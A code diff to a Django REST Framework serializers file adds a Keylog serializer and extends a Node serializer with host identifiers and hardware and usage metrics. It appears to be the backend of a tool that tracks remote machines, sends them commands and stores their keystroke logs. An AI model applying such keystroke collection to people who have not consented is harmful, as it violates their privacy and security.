@@ -18,6 +18,13 @@ class GroupSerializer(serializers.ModelSerializer):
         fields = ['name', 'permissions']
 
 
+class KeylogSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = Keylog
+        fields = ['id', 'log', 'timestamp', 'log_file']
+        extra_kwargs = {'id': {'read_only': True}}
+
+
 class CommandSerializer(serializers.ModelSerializer):
     class Meta:
         model = Command
@@ -74,12 +81,11 @@ class DiskSerializer(serializers.ModelSerializer):
 
 class NodeSerializer(serializers.ModelSerializer):
     disks = DiskSerializer(many=True, allow_null=True)
-    commands = CommandSerializer(many=True, allow_null=True, read_only=True)
 
     class Meta:
         model = Node
-        fields = ['id', 'hash_sum', 'host_name', 'ipv4', 'first_seen', 'last_seen', 'os', 'os_release',
-                  'os_version', 'device', 'processor', 'min_freq', 'max_freq', 'disks', 'commands']
+        fields = ['id', 'uuid', 'host_name', 'ipv4', 'first_seen', 'last_seen', 'os', 'os_release', 'os_version', 'device', 'processor', 'processor_cores',
+                  'min_freq', 'max_freq', 'memory_total', 'processor_freq', 'processor_temp', 'processor_usage', 'memory_usage', 'disks']
         extra_kwargs = {'id': {'read_only': True}}
 
     def create(self, validated_data):
@@ -99,8 +105,6 @@ class NodeSerializer(serializers.ModelSerializer):
     # I think this kinda sucks but I didn't write this
     def update(self, instance, validated_data, partial=True):
         disks = validated_data.pop('disks')
-        instance.hash_sum = validated_data.get(
-            'hash_sum', instance.hash_sum)
         instance.host_name = validated_data.get(
             'host_name', instance.host_name)
         instance.ipv4 = validated_data.get('ipv4', instance.ipv4)
@@ -114,6 +118,16 @@ class NodeSerializer(serializers.ModelSerializer):
             'processor', instance.processor)
         instance.min_freq = validated_data.get('min_freq', instance.min_freq)
         instance.max_freq = validated_data.get('max_freq', instance.max_freq)
+        instance.memory_total = validated_data.get(
+            'memory_total', instance.memory_total)
+        instance.processor_freq = validated_data.get(
+            'processor_freq', instance.processor_freq)
+        instance.processor_temp = validated_data.get(
+            'processor_temp', instance.processor_temp)
+        instance.processor_usage = validated_data.get(
+            'processor_usage', instance.processor_usage)
+        instance.memory_usage = validated_data.get(
+            'memory_usage', instance.memory_usage)
         instance.save()
 
         if disks is not None:
